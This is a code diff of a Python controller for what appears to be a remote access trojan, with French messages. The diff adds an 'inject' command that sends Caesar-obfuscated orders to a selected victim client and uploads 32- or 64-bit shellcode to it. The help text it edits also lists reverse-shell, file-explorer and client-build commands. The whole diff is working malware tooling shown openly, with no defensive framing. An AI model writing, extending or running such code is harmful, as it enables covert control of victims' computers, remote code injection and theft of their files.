@@ -171,7 +171,7 @@ def interact() :
     if CLIENT_IN_PATH == None : return "no client"
     client = CONNECT_CLIENTS[CLIENT_IN_PATH]
     
-    print(file_list)
+    #print(file_list)
     
     addr = client.getpeername()[0]
     addr = os.getcwd() + "\\" + addr.replace(".","_")
@@ -201,12 +201,13 @@ def interact() :
             print("\n\nTéléchargement terminé.\n\n")
 
         case "upload" :
+            print("\n\nUpload...\n\n")
             filename = easygui.fileopenbox()
 
             if filename == None or path_file_ex_2 == "" :
                 return 'no file selected'
 
-            print(f"{filename} --> {path_file_ex_2}")
+            #print(f"{filename} --> {path_file_ex_2}")
             
             client.send(CAESAR("upload_file\0").encode())
             
@@ -215,6 +216,7 @@ def interact() :
 
             fp = open(filename, "rb")
             upload_file(fp, client)
+            print("\n\nUpload terminé.\n\n")
             
         case "remove" :
             for i in files :
@@ -425,8 +427,9 @@ def main() -> None :
             print("select <ID> : sélectionne le client avec lequel intéragir")
             print("deselect : désélectionne le client précédemment séléctionné avec \"select\"")
             print("shell : ouvre un reverse shell dans le client précédemment séléctionné avec \"select\"")
-            print("build : build un client")
             print("fex : ouvre l'explorateur de fichiers")
+            print("inject <ARCH> <FILE> : upload un shellcode. ARCH --> 32/64")
+            print("build : build un client")
             print("")
 
         elif cmd == "exit" :
@@ -531,6 +534,37 @@ def main() -> None :
         elif cmd == "fex" :
             print("\nClique sur le lien ci-dessous pour voir le file explorer :")
             print("http://127.0.0.1:5000\n")
+
+        elif "inject" in cmd :
+            if SELECTED_CLIENT == -1 :
+                print("Vous n'avez aucun client sélectionné.")
+                continue
+            
+            client = CONNECT_CLIENTS[SELECTED_CLIENT]
+
+            parts = cmd.split(" ")
+            if len(parts) > 3 or len(parts) <= 2 :
+                print("Commande mal formée, \"help\" pour la syntaxe.")
+                continue
+
+            arch = parts[1]
+            if arch != "32" and arch != "64" :
+                print("Commande mal formée, \"help\" pour la syntaxe.")
+                continue
+
+            fichier = parts[2]
+            if not os.path.isfile(fichier) :
+                print(f"{fichier} n'a pas été trouvé.")
+                continue
+
+            client.send(CAESAR("inject").encode())
+            if arch == "32" :
+                client.send(CAESAR("x86").encode())
+            else :
+                client.send(CAESAR("x64").encode())
+
+            fp = open(fichier, "rb")
+            upload_file(fp, client)
 
         else :
             print("Commande non reconnue, \"help\" pour afficher la liste des commandes.")
